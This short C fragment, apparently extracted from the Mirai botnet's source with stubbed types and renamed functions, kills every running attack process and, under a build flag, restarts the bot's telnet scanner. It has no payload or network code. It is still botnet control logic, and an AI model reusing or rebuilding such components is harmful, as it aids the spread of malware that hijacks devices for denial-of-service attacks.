#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int ATTACK_CONCURRENT_MAX ; 
 scalar_t__* attack_ongoing ; 
 int /*<<< orphan*/  FUNC0 (scalar_t__,int) ; 
 int /*<<< orphan*/  FUNC1 (char*) ; 
 int /*<<< orphan*/  FUNC2 () ; 

void FUNC3(void)
{
    int i;

#ifdef DEBUG
    printf("[attack] Killing all ongoing attacks\n");
#endif

    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
            FUNC0(attack_ongoing[i], 9);
        attack_ongoing[i] = 0;
    }

#ifdef MIRAI_TELNET
    scanner_init();
#endif
}